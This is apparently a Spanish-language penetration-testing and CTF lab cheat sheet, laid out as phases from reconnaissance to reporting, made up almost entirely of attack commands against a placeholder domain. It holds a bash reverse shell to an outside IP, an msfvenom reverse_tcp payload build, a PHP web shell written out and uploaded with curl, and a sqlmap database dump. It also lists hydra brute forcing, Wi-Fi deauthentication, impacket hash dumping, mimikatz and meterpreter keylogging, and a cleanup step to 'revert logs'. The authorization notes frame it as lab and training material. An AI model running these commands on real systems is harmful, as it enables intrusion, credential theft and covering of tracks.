Toolchains: recon, web/API, cloud, AD, IoT, móviles, forense, kernel fuzzing

mkdir -p 01_entorno/{VMs,containers,logs,tools}
export PATH=$PATH:/usr/local/bin:/opt/tools/bin

2. Plan de Test y Amenazas Extremo

echo "Objetivos: captura de flags, escalada, lateral movement, cloud, web, IoT" > 02_plan/objetivos.txt
echo "Modelo MITRE ATT&CK completo, crown jewels identificadas" > 02_plan/modelos.txt
echo "Escenarios: externo, interno, wireless, cloud, físico, social" > 02_plan/escenarios.txt

3. Reconocimiento Pasivo / OSINT Avanzado

whois objetivo.com
dig ANY objetivo.com +short
sublist3r -d objetivo.com -o 03_recon/subs.txt
amass enum -d objetivo.com -passive -o 03_recon/amass.txt
theHarvester -d objetivo.com -b all -l 500 -f 03_recon/harvester.html
whatweb http://objetivo.com
wappalyzer-cli http://objetivo.com
crt.sh/?q=objetivo.com
exiftool archivos/*

4. Perímetro Externo / Scanning Extremo

nmap -p- -T4 -v -Pn objetivo.com -oN 04_scans/nmap_full.txt
nmap -sV -sC -p 80,443,22,3389 objetivo.com -oN 04_scans/nmap_service.txt
sslscan objetivo.com:443
nmap --script ssl-enum-ciphers -p 443 objetivo.com
nikto -h http://objetivo.com -o 04_scans/nikto.txt
dirb http://objetivo.com /usr/share/wordlists/dirb/common.txt -o 04_scans/dirb.txt
gobuster dir -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o 04_scans/gobuster.txt
ffuf -u http://objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 04_scans/ffuf.json
testssl.sh objetivo.com
nmap --script http-waf-detect -p 80,443 objetivo.com

5. Web / APIs / Explotación

feroxbuster -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js -t 50 -o 05_scans/ferox.txt
burpsuite
wpscan --url http://objetivo.com --enumerate u,ap,tt,cb
ffuf -u "http://objetivo.com/item?id=FUZZ" -w ids.txt
sqlmap -u "http://objetivo.com/item?id=1" --batch --level=5 --risk=2 --dump -o 05_scans/sqlmap
curl -F "file=@shell.php" http://objetivo.com/upload
burpsuite (CSRF, XSS)
postman / scripts fuzzing API
wsfuzzer / websocket testing
manual testing lógica de negocio

6. Cloud Extremo (AWS/Azure/GCP)

aws s3 ls
aws s3api get-bucket-acl --bucket nombre
aws iam list-users
aws lambda list-functions
az storage blob list
az network nsg list
az functionapp list
gcloud storage buckets list
gcloud storage buckets get-iam-policy
gcloud functions list
kubectl get pods --all-namespaces
docker ps -a
trivy image imagen:tag
clair-scanner

7. Red Interna / Lateral Movement

nmap -sP 192.168.0.0/24
arp-scan -l
smbclient -L //IP -U ""
rpcclient -U "" IP -c enumdomusers
proxychains nmap -sS 10.0.0.0/24
bloodhound-python -u usuario -p password -d dominio.local
impacket-secretsdump -just-dc-ntlm usuario:pass@IP
evil-winrm -i IP -u usuario -p pass
powersploit / seatbelt / crackmapexec

8. Wireless / BLE / NFC

airodump-ng wlan0mon
aircrack-ng -w wordlist.txt -b BSSID capture.cap
reaver -i wlan0mon -b BSSID -vv
bluetoothctl
rfidtool

9. Móvil

apktool d app.apk
mobSF
frida -U -f com.app -l script.js --no-pause
objection --gadget com.app explore
mitmproxy -p 8080
adb logcat

10. IoT / OT / Hardware

nmap -sV -O IP_dispositivo
binwalk firmware.bin
firmware-mod-kit
iot_fuzzer

11. Ingeniería Social (solo autorizado)

simulación phishing: gophish
vishing / smishing
Red Team controlado con safewords

12. Physical (solo autorizado)

observación de accesos, CCTV
documentación de políticas
sin forzar cerraduras

13. Post-Explotación / Manejo de Datos

hashcat --force hashes.txt -m 0 -a 3 ?a?a?a?a?a?a?a?a
mimikatz # privilegios
meterpreter: hashdump, keyscan_start
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
scp shell.exe usuario@lab:/tmp
gpg --symmetric --cipher-algo AES256 datos_sensibles.txt

14. Resiliencia / Purple Team

mapear hallazgos a MITRE ATT&CK
generar alertas y telemetría
pruebas controladas con Blue Team

15. Limpieza y Restauración

rm -rf /tmp/shell.exe /tmp/logs
powershell Remove-Item C:\Users\Public*.tmp
verify hashes, revert logs
coordinar con cliente

16. Reporte y Remediación

CVSS, NIST, impacto, plan de remediación
documentar hallazgos críticos
reunión de cierre, plan de retest

17. Retest

validación de fixes
captura evidencia post-fix
actualización de riesgos

18. Lecciones Aprendidas

retroalimentación
actualización de playbooks
roadmap de madurez

19. Apéndices

checklists completos
matrices OWASP / NIST / MITRE
plantillas cuaderno y evidencia
tabla de severidades
glosario



-----------------------------------
--------------------------------------

RESUMEN COMPLETO

Pentesting Extremo – Laboratorio CTF Avanzado

Estructura de carpetas:

mkdir -p ctf_lab/{00_preparacion,01_entorno,02_plan,03_recon,04_scans,05_web,06_cloud,07_interna,08_wireless,09_movil,10_iot,11_social,12_physical,13_explotacion,14_postexp,15_purple,16_limpieza,17_reporte,18_retest,19_lecciones}

Preparación y Legalidad

echo "Contrato revisado, alcance completo, ventanas de prueba" > 00_preparacion/autorizaciones.txt
echo "ROE: pruebas solo autorizadas, kill-switch activo" > 00_preparacion/roe.txt
echo "SOC contacto: soc@cliente.com, canales seguros" > 00_preparacion/comunicacion.txt

mkdir -p 00_preparacion/backups
cp /ruta/importante/* 00_preparacion/backups/
echo "Rollback listo" > 00_preparacion/backups/plan.txt

find . -type f -exec sha256sum {} ; >> 00_preparacion/evidencias_hash.txt
echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv
gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv

export SECRET_PASS="valor_super_secreto"
echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg

echo "[ ] Contrato revisado [ ] ROE definido [ ] SOC informado [ ] Backups preparados [ ] Evidencias cifradas" > 00_preparacion/checklist.txt

Reconocimiento y Footprinting

amass enum -d objetivo.com -o 03_recon/amass.txt
sublist3r -d objetivo.com -o 03_recon/subs.txt
theHarvester -d objetivo.com -b all -l 500 -f 03_recon/harvester.html
whois objetivo.com > 03_recon/whois.txt
dig axfr objetivo.com @ns.objetivo.com > 03_recon/zone_transfer.txt

nmap -p- -T4 -v -Pn objetivo.com -oN 04_scans/nmap_full.txt
nmap -sV -sC -p 80,443,22,3389,3306,6379 objetivo.com -oN 04_scans/nmap_services.txt
nmap --script vuln -p- objetivo.com -oN 04_scans/vuln_scan.txt

gobuster dir -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o 04_scans/gobuster.txt
ffuf -u http://objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 04_scans/ffuf.json

sslscan objetivo.com:443
nmap --script ssl-enum-ciphers -p 443 objetivo.com

Escaneo y Enumeración Avanzada

ftp objetivo.com

probar login anónimo

ftp> user anonymous

smbmap -H objetivo.com
enum4linux -a objetivo.com
crackmapexec smb objetivo.com -u users.txt -p passwords.txt

ssh usuario@objetivo.com
nc objetivo.com 22

mysql -h objetivo.com -u root -p
psql -h objetivo.com -U postgres

nikto -h http://objetivo.com -output 04_scans/nikto.txt

Aplicaciones Web y APIs

dirb http://objetivo.com /usr/share/wordlists/dirb/common.txt -o 05_web/dirb.txt
burpsuite &

sqlmap -u "http://objetivo.com/page.php?id=1" --batch --dbs --threads=10
sqlmap -u "http://objetivo.com/api" --json --technique=BEUSTQ --batch

ffuf -u "http://objetivo.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 05_web/ffuf.txt

dalfox file 05_web/urls.txt -o 05_web/xss_results.txt

hydra -L users.txt -P passwords.txt objetivo.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

Cloud (AWS/Azure/GCP)

aws s3 ls --profile default
aws s3api get-bucket-acl --bucket bucket_objetivo
aws iam list-users
aws lambda list-functions
az storage blob list --account-name myaccount
gcloud storage buckets list

kubectl get pods --all-namespaces
kubectl describe pod <pod>
docker images
docker inspect <imagen>

Red Interna

nmap -sS -p- 10.10.0.0/24 -oN 07_interna/nmap_internal.txt
arp-scan -l
nbtscan 10.10.0.0/24

enum4linux -a 10.10.0.5
crackmapexec smb 10.10.0.0/24 -u users.txt -p passwords.txt

Pivoting

ssh -L 9000:10.10.0.10:3389 user@bastion
proxychains nmap -sV 10.10.0.10

Wireless

airodump-ng wlan0
wash -i wlan0
aireplay-ng -0 5 -a <BSSID> -c <Cliente> wlan0
aircrack-ng -w wordlist.txt capture.cap

Móvil

adb shell
apktool d app.apk -o 09_movil/app
mitmproxy -p 8080 --mode transparent

ideviceinstaller -l
class-dump-z -H App.app -o 09_movil/headers

IoT / OT

binwalk firmware.bin -e -C 10_iot/
strings firmware.bin | less
nmap -p- -T4 10.0.0.0/24 -oN 10_iot/nmap_iot.txt

Ingeniería Social

setoolkit
gophish
echo "Resultado, click, submit" > 11_social/metricas.csv

Physical

echo "Registro físico de control: hora, observación, acción" > 12_physical/log.txt

Explotación avanzada

Buffer overflow

gcc -fno-stack-protector -z execstack vuln.c -o vuln
./vuln $(python3 -c 'print("A"*200)')

Remote code execution

curl -X POST -d "cmd=whoami" http://objetivo.com/vuln.php

Web shell

echo "<?php system(\$_GET['cmd']); ?>" > 13_explotacion/shell.php

subir y ejecutar con curl o burp

curl -F "file=@shell.php" http://objetivo.com/upload

Fuzzing

wfuzz -c -z file,/usr/share/wordlists/Discovery/Web-Content/big.txt --hc 404 http://objetivo.com/FUZZ

Kernel fuzzing / local

syzkaller -config=config.cfg

Post-Explotación y persistencia

Dump hashes

impacket-secretsdump -target objetivo.com -username user -password pass

Lateral movement

psexec.py dominio/user:pass@10.10.0.10
wmiexec.py dominio/user:pass@10.10.0.10

Reverse shell

nc -lvnp 4444
bash -i >& /dev/tcp/10.10.0.20/4444 0>&1

Resiliencia y Purple Team

echo "T1059, T1078, T1210..." > 15_purple/attck_mapeo.txt
logger "Test alerta Blue Team"

Limpieza

rm -rf /tmp/test*
rm -f /var/www/html/uploaded_test*
unset SECRET_PASS

Reporte

echo "Resumen ejecutivo y técnico, evidencias, riesgos CVSS/NIST" > 17_reporte/reporte_final.txt

Retest

nmap -sV objetivo.com -oN 18_retest/retest.txt

Lecciones aprendidas

echo "Actualizar playbooks y procedimientos, roadmap de madurez" > 19_lecciones/lecciones.txt
